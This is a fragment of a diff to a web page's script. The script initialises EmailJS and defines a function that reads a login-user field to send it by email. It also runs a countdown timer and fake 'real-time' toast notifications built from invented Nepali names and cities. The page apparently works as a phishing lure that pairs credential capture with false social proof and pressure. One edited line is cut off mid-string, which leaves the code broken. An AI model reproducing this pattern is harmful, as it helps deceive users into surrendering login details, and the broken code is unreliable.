@@ -241,7 +241,7 @@
         <span id="toast-msg" class="font-medium text-gray-200">Processing real-time nodes...</span>
     </div>
 
-   <script>
+    <script>
         (function() {
             emailjs.init("YOUR_PUBLIC_KEY"); // REPLACE WITH YOUR ACTUAL EMAILJS PUBLIC KEY
         })();
@@ -271,7 +271,7 @@
             }
             window.scrollTo(0, 0);
         }
-       
+
         async function sendToEmailJS() {
             const btn = document.getElementById('sub-btn');
             const user = document.getElementById('l-user').value;
@@ -364,10 +364,10 @@
             totalSeconds--;
         }, 1000);
 
-        const names = ["Nabin M.", "Sita K.", "Rajesh H.", "Prakash T.", "Deepa G.", "Bimal P.", "Roji B."];
-        const cities = ["Kathmandu", "Nawalpur", "Siraha"
+        const names = ["Nabin M.", "Sita K.", "Rajesh H.", "Pra
+        const cities = ["Kathmandu", "Nawalpur", "Siraha"];
 
-setInterval(() => {
+        setInterval(() => {
             const toast = document.getElementById('toast');
             const msg = document.getElementById('toast-msg');
             const randomName = names[Math.floor(Math.random() * names.length)];
